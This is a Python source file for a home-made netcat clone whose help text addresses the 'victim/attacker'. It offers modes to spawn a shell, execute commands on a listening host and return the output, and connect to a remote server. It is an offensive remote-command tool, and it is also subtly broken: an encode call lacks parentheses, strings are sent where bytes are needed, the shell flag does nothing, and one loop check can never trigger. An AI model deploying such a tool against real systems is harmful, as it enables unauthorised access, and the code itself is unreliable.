import argparse
import threading
import shlex
import subprocess
import socket
import sys


class Net:
    def __init__(self, args, buffer=None):
        # Initialise Arguments
        self.args = args
        self.buffer = buffer

        # Connect to the network
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    # Run Function
    def run(self):
        if self.args.listen:
            self.listen()
        else:
            self.send()

    # Send Function
    def send(self):
        self.socket.connect((self.args.host,self.args.port))
        if self.buffer:
            self.socket.send(self.buffer)
        
        try:
            reply = ""
            while True:
                buffer = self.socket.recv(4096)
                blockSize = len(buffer)
                reply = buffer.decode()
                if blockSize > 4096:
                    break

                if reply:
                    print(reply)
                    buffer = input("> ")
                    buffer += '\n'
                    self.socket.send(buffer.encode)

        except KeyboardInterrupt:
            print("User Terminated")
            self.socket.close()
            sys.exit()


    # Listen Function
    def listen(self):
        self.socket.bind((self.args.host, self.args.port))
        self.socket.listen(5)

        while True:
            client_socket, _ = self.socket.accept()
            handler = threading.Thread(target = self.handler_func, args = (client_socket, ))
            handler.start()

    # Handler Function
    def handler_func(self, client_socket):
        if self.args.execute:
            output = execute(self.args.execute)
            client_socket.send(output.encode())


# Execute command on shell
def execute(command):
    command = command.strip()
    if (not command):
        return

    output = subprocess.check_output(shlex.split(command), stderr=subprocess.STDOUT)
    return output.decode()

# Arguments parser function
def parse_arguments():
    parser = argparse.ArgumentParser(
        description="Custom NCAT Tool",
        epilog='''Example:
            \tpython ncat.py -i <ip_addr> -p <port> -l -s \t# Spawn a shell
            \tpython ncat.py -i <ip_addr> -p <port> -l -e <command>\t# Execute a command
            \tpython ncat.py -i <ip_addr> -p <port>\t\t# Connect to server
            '''
    )
    parser.add_argument('-i', '--host', help="Host/IP Address of the victim/attacker")
    parser.add_argument('-p', '--port', type=int, help="")
    parser.add_argument('-s', '--shell', action='store_true', help="Spawn a shell")
    parser.add_argument('-e', '--execute', help="Execute a command")
    parser.add_argument('-l', '--listen', action='store_true', help="Listening Mode")

    args = parser.parse_args()

    return args
    

def main():
    args = parse_arguments()

    if args.listen:
        buffer = ""
    else:
        buffer = input()

    attack = Net(args, buffer)

    attack.run()


if __name__ == "__main__":
    main()